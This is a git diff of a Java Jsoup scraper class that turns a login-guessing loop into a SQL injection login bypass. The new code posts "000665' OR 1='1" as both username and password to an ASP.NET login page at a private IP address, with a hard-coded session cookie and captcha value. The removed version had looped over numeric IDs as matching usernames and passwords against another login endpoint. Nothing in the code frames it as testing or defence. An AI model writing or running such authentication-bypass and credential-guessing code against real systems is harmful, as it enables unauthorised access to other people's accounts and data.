@@ -25,11 +25,11 @@ public class Test4 {
 	public static void main(String[] args) {
 		
 //		 String url="http://192.168.10.166:8080/htjyglxt/Login/checkLogin";
-		 String url="http://localhost/Zxxjw/Login/checkLogin";
+		 String url="http://192.168.4.1/yggl/yggl/Left.aspx";
 		 //17460018.shtml
 		 logger.info("开始执行!");
 		 try {
-			 for(int i=310475;i<310476;i++) {
+//			 for(int i=310475;i<310476;i++) {
 //				 String url="http://www.kanshuhai.com/0/0/616/"+i+".shtml";
 //				 Connection conn=Jsoup.connect(url).timeout(5000); 
 				 Connection conn=Jsoup.connect(url);
@@ -38,16 +38,16 @@ public class Test4 {
 				 conn.header("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6");  
 				 conn.header("Cache-Control", "max-age=0");  
 				 conn.header("Connection", "keep-alive");  
-				 conn.header("Cookie", "UM_distinctid=162282b1d19c5-04caf133afc5be-6b1b1279-1fa400-162282b1d1b6e; CNZZDATA1256504232=606182254-1521087090-%7C1521087090; SESSc60faee9ca2381b86f19bef9617d499b=e8ssnmn3ju527fdo3bsgoehs81; __cfduid=d71b54b98753e2a78275f07dbf8aa07961522303724; xqrclbr=81369; visited=1; homere=1; bdshare_firstime=1522303718060; has_js=1; Hm_lvt_0684e5255bde597704c827d5819167ba=1522303717; Hm_lpvt_0684e5255bde597704c827d5819167ba=1522303722; Hm_cv_0684e5255bde597704c827d5819167ba=1*login*PC-0!1*version*PC; _ga=GA1.2.88695297.1522303718; xqrcli=MTUyMjMwMzcyMiwxOTIwKjEwODAsV2luMzIsTmV0c2NhcGUsODEzNjk%3D");  
-				 conn.header("Host", "www.juzimi.com");  
+				 conn.header("Cookie", "ASP.NET_SessionId=n1uzdo55uxkh3e45h4ymzgmx; CheckCode=4679");  
+				 conn.header("Host", "192.168.4.1");  
 				 conn.header("If-Modified-Since", new Date().toString());  
 				 conn.header("If-None-Match", "\"468772839997c36742c0ecd9d8f775c2\"");  
 				 conn.header("Upgrade-Insecure-Requests", "1");  
 				 conn.header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");  
 				 Map<String, String> map=new HashMap<String, String>();
-				 map.put("loginName", i+"");
-				 map.put("loginPassWord", i+"");
-				 map.put("loginType", 1+"");
+				 map.put("menu", "user-login");
+				 map.put("username", "000665' OR 1='1");
+				 map.put("password", "000665' OR 1='1");
 				 conn.data(map);
 //            Document doc=Jsoup.connect(url).header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0").get();  
 				 try {
@@ -55,13 +55,14 @@ public class Test4 {
 //					 Elements ele=doc.getElementsByClass("with-tabs");
 //					 logger.info(ele.text());
 					 Document doc=conn.post();
-					 logger.info(doc.data());
+//					 logger.info(doc.data());
+					 logger.info(doc.html());
 				 }catch (Exception e) {
 					// TODO: handle exception
 //					 e.printStackTrace();
 					 logger.error("执行失败,异常解析:{}",e.getMessage()); 
 				}
-			 }
+//			 }
 		} catch (Exception e) {
 			logger.error("执行失败!"); 
 			e.printStackTrace();
